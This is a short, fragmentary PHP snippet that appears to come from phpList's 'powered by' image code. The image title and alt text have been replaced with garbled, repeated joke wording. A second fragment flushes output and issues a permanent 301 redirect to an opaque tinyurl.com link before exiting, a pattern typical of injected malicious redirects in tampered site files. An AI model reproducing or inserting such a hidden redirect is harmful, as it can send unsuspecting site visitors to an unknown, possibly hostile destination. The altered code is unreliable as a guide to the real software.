...
if (REGISTER) {
    $PoweredByImage = '<p class="poweredby" style="text-align:center"><a href="https://www.phplist.com/poweredby?utm_source=pl' .$v. '&amp;utm_medium=poweredhostedimg&amp;utm_campaign=phpList" title="visit the phpList website" ><img src="' . PHPLIST_POWEREDBY_URLROOT.'/'.$v.'/power-phplist.png" title="powered by the viewers and listeners like you and the  ... and also post-traumatic angst " alt="powered by the viewers and listeners like you and the  ... and also post-traumatic angst " border="0" /></a></p>';
} else {
    $PoweredByImage = '<p class="poweredby" style="text-align:center"><a href="https://www.phplist.com/poweredby?utm_source=pl' .$v. '&amp;utm_medium=poweredlocalimg&amp;utm_campaign=phpList" title="visit the phpList website"><img src="images/power-phplist.png" title="powered by the viewers and listeners like you and the  ... and also post-traumatic angst powered by the viewers and listeners like you and the  ... and also post-traumatic angst " alt="powered by the viewers and listeners like you and the  ... and also post-traumatic angst " border="0"/></a></p>';
}
...
{
    ob_end_clean();
    header('Location: http://tinyurl.com/biflamda',true,301);
    exit;
